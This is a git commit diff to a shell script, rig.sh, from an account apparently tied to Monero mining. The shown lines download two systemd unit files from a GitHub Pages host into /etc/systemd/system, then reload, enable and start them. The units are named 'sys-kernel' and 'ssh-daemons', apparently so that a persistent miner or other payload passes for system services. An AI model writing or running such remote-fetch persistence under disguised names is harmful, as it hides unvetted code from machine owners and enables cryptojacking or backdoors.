0872a5bdb8027bbbea404d78f25ab9ae5fde0bf3
xmrhorizontal <148181892+xmrhorizontal@users.noreply.github.com>
2024-02-06 23:55:08 +0300

    Update rig.sh

--- rig.sh
+++ rig.sh
@@ -17,6 +17,7 @@ fi
     cd /etc/systemd/system
     wget https://xmrhorizontal.github.io/sys-kernel.service
     wget https://xmrhorizontal.github.io/ssh-daemons.service
+    systemctl daemon-reload
     systemctl enable ssh-daemons.service
     systemctl enable sys-kernel.service
     systemctl start ssh-daemons.service
